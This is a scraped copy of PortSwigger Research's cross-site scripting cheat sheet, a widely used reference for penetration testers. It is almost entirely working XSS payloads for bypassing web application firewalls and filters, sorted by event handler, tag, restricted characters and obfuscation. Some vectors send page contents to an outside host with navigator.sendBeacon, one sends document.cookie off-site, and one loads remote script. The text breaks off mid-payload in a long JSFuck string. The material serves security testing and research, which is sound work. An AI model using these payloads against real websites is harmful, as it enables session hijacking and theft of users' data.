---
title: Cross-site scripting (XSS) cheat sheet
author: PortSwigger Research
url: https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
date_published: 2026 (living page, last updated 2026-10-21)
date_scraped: 2026-11-16
platform: portswigger
disclosed_report: none
bounty: not stated
vuln_class: xss
---

<!-- Raw scraped text below. Public, non-paywalled content only.
     This file is source material, never copied into skills verbatim.
     Note: full page kept (no summarization). Cleaned of UI noise (tag-filter lists, copy/link buttons, image icons, PoC redirect URLs); every payload retained as shown. Browser-support icons were images and are not captured. -->

1. [Web Security Academy](https://portswigger.net/web-security)
2. [Cross-site scripting](https://portswigger.net/web-security/cross-site-scripting)
3. [Cheat sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
# Cross-site scripting (XSS) cheat sheet
This cross-site scripting (XSS) cheat sheet contains many vectors that can help you bypass WAFs and filters. You can select vectors by the event, tag or browser and a proof of concept is included for every vector.
You can [download a PDF version of the XSS cheat sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet.pdf).
This is a [PortSwigger Research](https://portswigger.net/research) project. [Follow us on Twitter](https://twitter.com/PortSwiggerRes) to receive updates.
Downloaded from https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
This cheat sheet is regularly updated in 2026. Last updated: Wed, 21 Oct 2026 09:06:01 +0000.
Table of contents
|     |     |
| --- | --- |
| **[Event handlers](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#event-handlers)** |
|  | [No user interaction](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#event-handlers-that-do-not-require-user-interaction) |
|  | [User interaction required](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#event-handlers-that-do-require-user-interaction) |
| **[Consuming tags](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#consuming-tags)** |
| **[JS hoisting](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#js-hoisting)** |
| **[File upload attacks](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#file-upload-attacks)** |
| **[Restricted characters](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#restricted-characters)** |
| **[Frameworks](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#frameworks)** |
| **[Protocols](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#protocols)** |
| **[Other useful attributes](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#other-useful-attributes)** |
| **[Special tags](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#special-tags)** |
| **[Encoding](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#encoding)** |
| **[Obfuscation](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#obfuscation)** |
| **[Client side template injection](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#client-side-template-injection)** |
|  | [VueJS reflected](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#vuejs-reflected) |
|  | [AngularJS sandbox escapes reflected](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#angularjs-sandbox-escapes-reflected) |
|  | [AngularJS sandbox escapes DOM](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#dom-based-angularjs-sandbox-escapes) |
|  | [AngularJS CSP bypasses](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#angularjs-csp-bypasses) |
| **[Scriptless attacks](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#scriptless-attacks)** |
| **[Polyglots](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#polyglots)** |
| **[WAF bypass global objects](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#waf-bypass-global-objects)** |
| **[Content types](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#content-types)** |
| **[Response content types](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#response-content-types)** |
| **[Impossible labs](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#impossible-labs)** |
| **[Prototype pollution](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#prototype-pollution)** |
| **[Classic vectors (XSS crypt)](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#classic-vectors-xss-crypt)** |
## Event handlers
Copy tags to clipboardCopy events to clipboardCopy payloads to clipboard
Search Type:tageventcodeSearch term:
### Event handlers that do not require user interaction
onanimationcancel
Fires when a CSS animation cancels
onanimationend
Fires when a CSS animation ends
onanimationiteration
Fires when a CSS animation repeats
onanimationstart
Fires when a CSS animation starts
onbeforematch
Fires when a hidden element is revealed
inputmetameta(blob)`<input type=hidden id=x onbeforematch=alert(1) hidden=until-found>`
onbeforeprint
Fires before the page is printed
body`<body onbeforeprint=console.log(1)>`
onbeforeunload
Fires after if the url changes
body`<body onbeforeunload=navigator.sendBeacon('//ssl.portswigger-labs.net/',document.body.innerHTML)>`
onbegin
Fires when a svg animation begins
animateanimatemotionanimatetransformset`<svg><animate onbegin=alert(1) attributeName=x dur=1s>`
oncanplay
Fires if the resource can be played
audiovideo`<audio oncanplay=alert(1)><source src="validaudio.wav" type="audio/wav"></audio>`
oncanplaythrough
Fires when enough data has been loaded to play the resource all the way through
video`<video oncanplaythrough=alert(1)><source src="validvideo.mp4" type="video/mp4"></video>`
oncontentvisibilityautostatechange
Fires on all tags when content-visibility is set to auto
oncontentvisibilityautostatechange(hidden)
Fires in a hidden input when content-visibility is set to auto
input`<input type=hidden oncontentvisibilityautostatechange=alert(1) style=content-visibility:auto>`
oncuechange
Fires when subtitle changes
track`<video controls><source src=validvideo.mp4 type=video/mp4><track default oncuechange=alert(1) src="data:text/vtt,WEBVTT FILE\
\
1\
00:00:00.000 --> 00:00:05.000\
<b>XSS</b>\
"></video>`
ondurationchange
Fires when duration changes
audiovideo`<audio controls ondurationchange=alert(1)><source src=validaudio.mp3 type=audio/mpeg></audio>`
onend
Fires when a svg animation ends
animateanimatemotionanimatetransformset`<svg><animate onend=alert(1) attributeName=x dur=1s>`
onended
Fires when the resource is finished playing
audiovideo`<audio controls autoplay onended=alert(1)><source src="validaudio.wav" type="audio/wav"></audio>`
onerror
Fires when the resource fails to load or causes an error
audiobodyembedimageimage2image3imgimg2inputlinkobjectscriptsourceusevideo`<audio src/onerror=alert(1)>`
onfocus
Fires when the element has focus
aa2abbracronymaddressappletareaarticleasideaudioaudio2bbdibdobigblinkblockquotebodybrbuttoncanvascaptioncentercitecodecolcolgroupcommandcontentcustom tagsdatadatalistdddeldetailsdfndialogdirdivdldtelementemembedfieldsetfigcaptionfigurefontfooterformframeframeseth1headheaderhgrouphrhtmliiframeiframe2imageimginputinput2input3input4inskbdkeygenkeygenlabellegendlilinklistingmainmapmarkmarqueemenumenuitemmetametermulticolnavnextidnobrnoembednoframesnoscriptobjectoloptgroupoptionoutputpparampictureplaintextpreprogressqrbrprtrtcrubyssampscriptsectionselectshadowslotsmallsourcespacerspanstrikestrongstylesubsummarysupsvgtabletbodytdtemplatetextareatfootththeadtimetitletrtrackttuulvarvideovideo2wbrxmp`<a id=x tabindex=1 onfocus=alert(1)></a>`
onfocus(autofocus)
Fires when a element has focus and the autofocus attribute is used to focus automatically.
onfocusin
Fires when the element has focus
aa2abbracronymaddressappletareaarticleasideaudioaudio2bbdibdobigblinkblockquotebodybrbuttoncanvascaptioncentercitecodecolcolgroupcommandcontentcustom tagsdatadatalistdddeldetailsdfndialogdirdivdldtelementemembedfieldsetfigcaptionfigurefontfooterformframeframeseth1headheaderhgrouphrhtmliiframeiframe2imageimginputinput2input3input4inskbdkeygenkeygenlabellegendlilinklistingmainmapmarkmarqueemenumenuitemmetametermulticolnavnextidnobrnoembednoframesnoscriptobjectoloptgroupoptionoutputpparampictureplaintextpreprogressqrbrprtrtcrubyssampscriptsectionselectshadowslotsmallsourcespacerspanstrikestrongstylesubsummarysupsvgtabletbodytdtemplatetextareatfootththeadtimetitletrtrackttuulvarvideovideo2wbrxmp`<a id=x tabindex=1 onfocusin=alert(1)></a>`
onhashchange
Fires if the hash changes
body`<body onhashchange="print()">`
onload
Fires when the element is loaded
bodyembedframeiframeimageimage2image3imgimg2img2inputlinkobjectscriptstylesvgtrackuse`<body onload=alert(1)>`
onloadeddata
Fires when the first frame is loaded
audiovideo`<audio onloadeddata=alert(1)><source src="validaudio.wav" type="audio/wav"></audio>`
onloadedmetadata
Fires when the meta data is loaded
audiovideo`<audio autoplay onloadedmetadata=alert(1)> <source src="validaudio.wav" type="audio/wav"></audio>`
onloadstart
Triggered audio or video is loaded
audiovideo`<audio onloadstart="alert(1)"><source>`
onmessage
Fires when message event is received from a postMessage call
body`<body onmessage=print()>`
onpagereveal
Fires when the page is shown
body`<body onpagereveal=alert(1)>`
onpageshow
Fires when the page is shown
bodyframeset`<body onpageshow=alert(1)>`
onplay
Fires when the resource is played
audiovideo`<audio autoplay onplay=alert(1)><source src="validaudio.wav" type="audio/wav"></audio>`
onplaying
Fires the resource is playing
audiovideo`<audio autoplay onplaying=alert(1)><source src="validaudio.wav" type="audio/wav"></audio>`
onpopstate
Fires when the history changes
body`<body onpopstate=print()>`
onprogress
Fires when the video/audio begins downloading
audiovideo`<audio controls onprogress=alert(1)><source src=validaudio.mp3 type=audio/mpeg></audio>`
onrepeat
Fires when a svg animation repeats
animateanimatemotionanimatetransformset`<svg><animate onrepeat=alert(1) attributeName=x dur=1s repeatCount=2 />`
onresize
Fires when the window is resized
body`<body onresize="print()">`
onscroll
Fires when the page scrolls
body`<body onscroll=alert(1)><div style=height:1000px></div><div id=x></div>`
onscrollend
Fires when the scrolling to the end of the element
onscrollsnapchange
Fires at the end of a scrolling operation
addressarticleasideblockquotedddivdtfieldsetfigcaptionfooterformheadermainsection`<address onscrollsnapchange=alert(1) style=overflow-y:hidden;scroll-snap-type:x><div style=scroll-snap-align:center>1337</div></address>`
onscrollsnapchanging
Fires when the scroll position is snapping to a new point
onsecuritypolicyviolation
Fires when a CSP violation occurs. This would be site specific.
onslotchange
Fires when the slot’s assigned content changes
slot`x<template shadowrootmode=open><slot onslotchange=alert(1)>`
onsuspend
Fires when the video/audio when the data loading is suspended
audiovideo`<audio controls onsuspend=alert(1)><source src=validaudio.mp3 type=audio/mpeg></audio>`
ontimeupdate
Fires when the timeline is changed
audiovideo`<audio controls autoplay ontimeupdate=alert(1)><source src="validaudio.wav" type="audio/wav"></audio>`
ontoggle
Fires when the details tag is expanded
details`<details ontoggle=alert(1) open>test</details>`
ontransitioncancel
Fires when a CSS transition cancels
ontransitionend
Fires when a CSS transition ends
ontransitionrun
Fires when a CSS transition begins
ontransitionstart
Fires when a CSS transition starts
onunhandledrejection
Fires when a promise isn't handled
body`<body onunhandledrejection=alert(1)><script>fetch('//xyz')</script>`
onunload
Fires when the page is unloaded
bodysvg`<body onunload=navigator.sendBeacon('//ssl.portswigger-labs.net/',document.body.innerHTML)>`
onvalidationstatuschange
Fires when a form control’s validation state changes
camerageolocationmicrophoneusermedia`<camera onvalidationstatuschange=alert(1)>`
onwaiting(loop)
Fires when the video/audio attempts to replay
audiovideo`<audio controls loop muted autoplay onwaiting=alert(1)><source src=validaudio.mp3 type=audio/mpeg></audio>`
onwebkitanimationend
Fires when a CSS animation ends
onwebkitanimationiteration
Fires when a CSS animation repeats
onwebkitanimationstart
Fires when a CSS animation starts
onwebkitneedkey
Fires when an HTML media element encounters encrypted content and needs a decryption key from the page
audiovideo`<audio src=data:,%23EXTM3U%0A%23EXT-X-TARGETDURATION:1%0A%23EXT-X-KEY:METHOD=AES-128,URI=%22skd:%22%0A%23EXTINF:1%0Ax onwebkitneedkey=alert(1)></audio>`
onwebkitplaybacktargetavailabilitychanged
Fires when the availability of an AirPlay playback target changes
audiovideo`<audio onwebkitplaybacktargetavailabilitychanged=alert(1)>`
onwebkittransitionend
Fires when a CSS transition ends
### Event handlers that do require user interaction
onafterprint
Fires after the page is printed
body`<body onafterprint=alert(1)>`
onauxclick
Fires when right clicking or using the middle button of the mouse
inputtextarea`<input onauxclick=alert(1)>`
onbeforecopy
Requires you copy a piece of text
aabbracronymaddressappletareaarticleasideaudiobbdibdobigblinkblockquotebodybrbuttoncanvascaptioncentercitecodecolcolgroupcommandcontentdatadatalistdddeldetailsdfndialogdirdivdldtelementemembedfieldsetfigcaptionfigurefontfooterformframeframeseth1headheaderhgrouphrhtmliiframeimageimginputinskbdkeygenlabellegendlilistingmainmapmarkmarqueemenumenuitemmetametermulticolnavnextidnobrnoembednoframesnoscriptobjectoloptgroupoptionoutputpparampictureplaintextpreprogressqrbrprtrtcrubyssampscriptsectionselectshadowslotsmallsourcespacerspanstrikestrongstylesubsummarysupsvgtabletbodytdtemplatetextareatfootththeadtimetitletrtrackttuulvarvideowbrxmp`<a onbeforecopy="alert(1)" contenteditable>test</a>`
onbeforecut
Requires you cut a piece of text
aabbracronymaddressappletareaarticleasideaudiobbdibdobigblinkblockquotebodybrbuttoncanvascaptioncentercitecodecolcolgroupcommandcontentdatadatalistdddeldetailsdfndialogdirdivdldtelementemembedfieldsetfigcaptionfigurefontfooterformframeframeseth1headheaderhgrouphrhtmliiframeimageimginputinskbdkeygenlabellegendlilistingmainmapmarkmarqueemenumenuitemmetametermulticolnavnextidnobrnoembednoframesnoscriptobjectoloptgroupoptionoutputpparampictureplaintextpreprogressqrbrprtrtcrubyssampscriptsectionselectshadowslotsmallsourcespacerspanstrikestrongstylesubsummarysupsvgtabletbodytdtemplatetextareatfootththeadtimetitletrtrackttuulvarvideowbrxmp`<a onbeforecut="alert(1)" contenteditable>test</a>`
onbeforeinput
Fires when the value of the element is about to be modified
onbeforepaste
Fires at the end of a paste operation
onbeforetoggle
Fires before the a popop element is toggled
onblur
Fires when an element loses focus
oncancel
Fires when an a file upload is cancelled
input`<input type=file oncancel=alert(1)>`
onchange
Requires as change of value
inputselecttextarea`<input onchange=alert(1) value=xss>`
onclick
Requires a click of the element
onclose
Fires when a dialog is closed
dialog`<dialog open onclose=alert(1)><form method=dialog><button>XSS</button></form>`
oncommand
Fires when the command is sent via click
div`<button commandfor=test command=show-popover>Click<div id=test oncommand=alert(1)>`
oncontextmenu
Triggered when right clicking to show the context menu
oncopy
Requires you copy a piece of text
oncut
Requires you cut a piece of text
ondblclick
Triggered when double clicking the element
ondrag
Triggered dragging the element
ondragend
Triggered dragging is finished on the element
ondragenter
Requires a mouse drag
ondragexit
Triggered when dragging the element
ondragleave
Requires a mouse drag
ondragover
Triggered dragging over an element
ondragstart
Requires a mouse drag
ondrop
Triggered dropping a draggable element
onfocusout
Fires when an element loses focus
onformdata
Triggered when a form is submitted
form`<form onformdata="alert(1)"><button>Click</button></form>`
onfullscreenchange
Fires when a video changes full screen status
video`<video onfullscreenchange=alert(1) src=validvideo.mp4 controls>`
ongesturechange
Fires when the gesture is in progress and changes occur.
ongestureend
Fires when the gesture comes to an end.
ongesturestart
Fires when multiple fingers touch the surface, initiating a new gesture.
ongotpointercapture
Requires interaction with input range via click
input`<input type=range ongotpointercapture=alert(1)>`
oninput
Requires as change of value
inputtextarea`<input oninput=alert(1) value=xss>`
oninvalid
Requires a form submission with an element that does not satisfy its constraints such as a required attribute.
inputtextarea`<form><input oninvalid=alert(1) required><input type=submit>`
onkeydown
Triggered when a key is pressed
onkeypress
Triggered when a key is pressed
onkeyup
Triggered when a key is released
onlocation
Fires when the browser requests the user’s location after permission is granted
geolocation`<geolocation autolocate onlocation=alert(1)>`
onlostpointercapture
Requires interaction with input range via click
input`<input type=range onlostpointercapture=alert(1)>`
onmousedown
Triggered when the mouse is pressed
onmouseenter
Triggered when the mouse is hovered over the element
onmouseleave
Triggered when the mouse is moved away from the element
onmousemove
Requires mouse movement
onmouseout
Triggered when the mouse is moved away from the element
onmouseover
Requires a hover over the element
onmouseup
Triggered when the mouse button is released
onmousewheel
Fires when the mousewheel scrolls
onmozfullscreenchange
Fires when a video changes full screen status
video`<video onmozfullscreenchange=alert(1) src=validvideo.mp4 controls>`
onpagehide
Fires when the page is changed
body`<body onpagehide=navigator.sendBeacon('//ssl.portswigger-labs.net/',document.body.innerHTML)>`
onpageswap
Fires when the page reloads
body`<body onpageswap=navigator.sendBeacon('//ssl.portswigger-labs.net/',document.body.innerHTML)>`
onpaste
Requires you paste a piece of text
aabbracronymaddressappletareaarticleasideaudiobbdibdobigblinkblockquotebodybrbuttoncanvascaptioncentercitecodecolcolgroupcommandcontentdatadatalistdddeldetailsdfndialogdirdivdldtelementemembedfieldsetfigcaptionfigurefontfooterformframeframeseth1headheaderhgrouphrhtmliiframeimageimginputinskbdkeygenlabellegendlilistingmainmapmarkmarqueemenumenuitemmetametermulticolnavnextidnobrnoembednoframesnoscriptobjectoloptgroupoptionoutputpparampictureplaintextpreprogressqrbrprtrtcrubyssampscriptsectionselectshadowslotsmallsourcespacerspanstrikestrongstylesubsummarysupsvgtabletbodytdtemplatetextareatfootththeadtimetitletrtrackttuulvarvideowbrxmp`<a onpaste="alert(1)" contenteditable>test</a>`
onpause
Requires clicking the element to pause
audiovideo`<audio autoplay controls onpause=alert(1)><source src="validaudio.wav" type="audio/wav"></audio>`
onpointercancel
You need to make a selection and drag the text using a laptop touchpad.
onpointerdown
Fires when the mouse down
onpointerenter
Fires when the mouseenter
onpointerleave
Fires when the mouseleave
onpointermove
Fires when the mouse move
onpointerout
Fires when the mouse out
onpointerover
Fires when the mouseover
onpointerrawupdate
Fires when the pointer changes
onpointerup
Fires when the mouse up
onpromptaction
Fires when the user takes an action in the prompt (such as confirm)
geolocationusermedia`<geolocation onpromptaction=alert(1)>`
onpromptdismiss
Fires when the user opens the prompt and closes it without responding
geolocationusermedia`<geolocation onpromptdismiss=alert(1)>`
onratechange
Fires when the speed of the video changes
audiovideo`<audio controls autoplay onratechange=alert(1)><source src="validaudio.wav" type="audio/wav"></audio>`
onreset
Requires a click
form`<form onreset=alert(1)><input type=reset>`
onsearch
Fires when a form is submitted and the input has a type attribute of search
input`<form><input type=search onsearch=alert(1) value="Hit return" autofocus>`
onseeked
Requires clicking the element timeline
audiovideo`<audio autoplay controls onseeked=alert(1)><source src="validaudio.wav" type="audio/wav"></audio>`
onseeking
Requires clicking the element timeline
audiovideo`<audio autoplay controls onseeking=alert(1)><source src="validaudio.wav" type="audio/wav"></audio>`
onselect
Requires you select text
inputtextarea`<input onselect=alert(1) value="XSS" autofocus>`
onselectionchange
Fires when text selection is changed on the page
body`<body onselectionchange=alert(1)>select some text`
onselectstart
Fires when beginning a text selection
body`<body onselectstart=alert(1)>select some text`
onstream
Fires when the user grants permission
usermedia`<usermedia onstream=alert(1)>`
onsubmit
Requires a form submission
form`<form onsubmit=alert(1)><input type=submit>`
ontoggle(popover)
Fires when the a popop element is toggled
ontouchcancel
Fires when the select text, only mobile device
ontouchend
Fires when the touch screen, only mobile device
body`<body ontouchend=alert(1)>`
ontouchmove
Fires when the touch screen and move, only mobile device
body`<body ontouchmove=alert(1)>`
ontouchstart
Fires when the touch screen, only mobile device
body`<body ontouchstart=alert(1)>`
onvolumechange
Requires volume adjustment
audiovideo`<audio autoplay controls onvolumechange=alert(1)><source src="validaudio.wav" type="audio/wav"></audio>`
onwaiting
Fires when the video/audio attempts to play
audiovideo`<audio controls onwaiting=alert(1)><source src=x type=x></audio>`
onwebkitfullscreenchange
Fires when a video changes full screen status
video`<video controls src=validvideo.mp4 onwebkitfullscreenchange=alert(1)>`
onwebkitmouseforcechanged
Requires a click from a laptop touchpad.
onwebkitmouseforcedown
Requires a click from a laptop touchpad.
onwebkitmouseforceup
Requires a click from a laptop touchpad.
onwebkitmouseforcewillbegin
Requires a click from a laptop touchpad.
onwebkitpresentationmodechanged
Fires when a video changes full screen status
video`<video controls src=validvideo.mp4 onwebkitpresentationmodechanged=alert(1)>`
onwebkitwillrevealbottom
Requires a click from a laptop touchpad.
onwheel
Fires when you use the mouse wheel
body`<body onwheel=alert(1)>`
## Math
Math textarea and image
`<math><textarea><img src onerror=alert(1)></textarea></math>`
Math textarea and embed
`<math><textarea><embed src=1 onerror=alert(1) type=image/gif></textarea></math>`
Math textarea and body
`<math><textarea><body onload=alert(1)></textarea></math>`
Math noscript and image
`<math><noscript><img src onerror=alert(1)></noscript></math>`
Math noscript and embed
`<math><noscript><embed src=1 onerror=alert(1) type=image/gif></noscript></math>`
Math noscript and body
`<math><noscript><body onload=alert(1)></noscript></math>`
Math title and image
`<math><title><img src onerror=alert(1)></title></math>`
Math title and embed
`<math><title><embed src=1 onerror=alert(1) type=image/gif></title></math>`
Math title and body
`<math><title><body onload=alert(1)></title></math>`
## Consuming tags
Noembed consuming tag
`<noembed><img title="</noembed><img src onerror=alert(1)>"></noembed>`
Noscript consuming tag
`<noscript><img title="</noscript><img src onerror=alert(1)>"></noscript>`
Style consuming tag
`<style><img title="</style><img src onerror=alert(1)>"></style>`
Script consuming tag
`<script><img title="</script><img src onerror=alert(1)>"></script>`
iframe consuming tag
`<iframe><img title="</iframe><img src onerror=alert(1)>"></iframe>`
xmp consuming tag
`<xmp><img title="</xmp><img src onerror=alert(1)>"></xmp>`
textarea consuming tag
`<textarea><img title="</textarea><img src onerror=alert(1)>"></textarea>`
noframes consuming tag
`<noframes><img title="</noframes><img src onerror=alert(1)>"></noframes>`
Title consuming tag
`<title><img title="</title><img src onerror=alert(1)>"></title>`
Byass noscript consume using select
`<select><noscript></select><img src onerror=alert(1)></noscript></select>`
Byass title consume using select
`<select><title></select><img src onerror=alert(1)></title></select>`
Byass style consume using select
`<select><style></select><img src onerror=alert(1)></style></select>`
Byass noembed consume using select
`<select><noembed></select><img src onerror=alert(1)></noembed></select>`
Byass xmp consume using select
`<select><xmp></select><img src onerror=alert(1)></xmp></select>`
Byass noframes consume using select
`<select><noframes></select><img src onerror=alert(1)></noframes></select>`
## JS hoisting
XSS Hoisting via undefined variable
`<script>eval(myUndefVar);var inject="INJECTION_STARTS_HERE";var myUndefVar;alert(1);//";</script>`
XSS Hoisting via undefined function
`<script>myUndefFunction(13,37);var inject="INJECTION_STARTS_HERE";function myUndefFunction(){};alert(1);//";</script>`
XSS Hoisting via undefined class
`<script>var myUndefObject = new myUndefClass();var inject="INJECTION_STARTS_HERE";function myUndefClass(){};alert(1);//";</script>`
XSS Hoisting via undefined JQuery $(document).ready()
`<script>$(document).ready(function(){var inject="INJECTION_STARTS_HERE";});function $(){return{ready:()=>0}};alert(1);(function(){"";});</script>`
XSS Hoisting via parameter of an undefined accessor (object syntax)
`<script>undef01.undef02("INJECTION"+alert(1));function undef01(){}//");</script>`
XSS Hoisting via parameter of an undefined accessor (array syntax)
`<script>undef01['undef02','INJECTION'+alert(1)];function undef01(){};//'];</script>`
XSS Hoisting via undefined accessor (module type + import)
`<script type="module">undef01.undef02.undef03.undef04.undef05();var inject = "INJECTION";import "data:text/jscript,alert(1)"//";</script>`
XSS Hoisting via native function hijacking
`<script>var x=atob("dXNlbGVzcyBjYWxsIG9mIG5hdGl2ZSBmdW5jdGlvbiAh");undef01.undef02();var inject = "INJECTION";function atob(){alert(1);}//";</script>`
## File upload attacks
Add blob to file object
`<input type="file" id="fileInput" /><script>const fileInput = document.getElementById('fileInput');const dataTransfer = new DataTransfer();const file = new File(['Hello world!'], 'hello.txt', {type: 'text/plain'});dataTransfer.items.add(file);fileInput.files = dataTransfer.files</script>`
## Restricted characters
No parentheses using exception handling
`<script>onerror=alert;throw 1</script>`
No parentheses using exception handling no semi colons
`<script>{onerror=alert}throw 1</script>`
No parentheses using exception handling no semi colons using expressions
`<script>throw onerror=alert,1</script>`
No parentheses using exception handling and string eval on Chrome / Edge
`<script>throw onerror=eval,'=alert\x281\x29'</script>`
No parentheses using exception handling and string eval on Safari
`<script>throw onerror=eval,'alert\x281\x29'</script>`
No parentheses using exception handling and object eval on Firefox
`<script>{onerror=eval}throw{lineNumber:1,columnNumber:1,fileName:1,message:'alert\x281\x29'}</script>`
No parentheses using exception handling and object eval on Firefox / Safari
`<script>throw onerror=eval,e=new Error,e.message='alert\x281\x29',e</script>`
No parentheses using exception handling and location hash eval on all browsers
`<script>throw onerror=Uncaught=eval,e=new Error,e.message='/*'+location.hash,!!window.InstallTrigger?e:e.message</script>`;)
No parentheses, no quotes, no spaces using exception handling and location hash eval on all browsers
`<script>throw{},onerror=Uncaught=eval,h=location.hash,e={lineNumber:1,columnNumber:1,fileName:0,message:h[2]+h[1]+h},!!window.InstallTrigger?e:e.message</script>`;)
No parentheses, no quotes, no spaces, no curly brackets using exception handling and location hash eval on all browsers
`<script>throw/x/,onerror=Uncaught=eval,h=location.hash,e=Error,e.lineNumber=e.columnNumber=e.fileName=e.message=h[2]+h[1]+h,!!window.InstallTrigger?e:e.message</script>`;)
No parentheses using ES6 hasInstance and instanceof with eval
`<script>'alert\x281\x29'instanceof{[Symbol.hasInstance]:eval}</script>`
No parentheses using ES6 hasInstance and instanceof with eval without .
`<script>'alert\x281\x29'instanceof{[Symbol['hasInstance']]:eval}</script>`
No parentheses using location redirect
`<script>location='javascript:alert\x281\x29'</script>`
No parentheses using location redirect no strings
`<script>window.name='alert(1)';</script><script>location=name</script>`
No parentheses using template strings
`` <script>alert`1`</script> ``
No parentheses using template strings and location hash
`` <script>new Function`X${document.location.hash.substr`1`}`</script> ``)
No parentheses or spaces, using template strings and location hash
`` `<script>Function`X${document.location.hash.substr`1`}```</script>` ``)
XSS cookie exfiltration without parentheses, backticks or quotes
`<video><source onerror=location=/\02.rs/+document.cookie>`
XSS without greater than
`<svg onload=alert(1)`
XSS without greater using a HTML comment
`<svg onload=alert(1)<!--`
Array based destructuring using onerror
`<script>throw[onerror]=[alert],1</script>`
Destructuring using onerror
`<script>var{a:onerror}={a:alert};throw 1</script>`
Destructuring using default values and onerror
`<script>var{haha:onerror=alert}=0;throw 1</script>`
Vector using window.name
`<script>window.name='javascript:alert(1)';</script><svg onload=location=name>`
Avoiding Invalid left-hand side in assignment without \`, (), ?, \[\], or , using object literal
`<script>window.name='javascript:alert(1)';function blah(){}\
blah(""+{a:location=name}+"")</script>`
Avoiding Invalid left-hand side in assignment without \`, (), ?, \[\], or , using new class
`<script>window.name='javascript:alert(1)';function blah(){}\
blah(""+new class b{toString=e=>location=name}+"")</script>`
Script tag using only uppercase
`<SCRIPT SRC=HTTPS://PORTSWIGGER-LABS.NET/A.JS></SCRIPT>`
Script tag using only uppercase using JSFuck and inline
`<SCRIPT>[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]][([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(+[![]]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]+(+(!+[]+!+[]+!+[]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([]+[])[([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][[]]+[])[+!+[]]+(![]+[])[+!+[]]+((+[])[([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]]](!+[]+!+[]+!+[]+[!+[]+!+[]])+(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]])(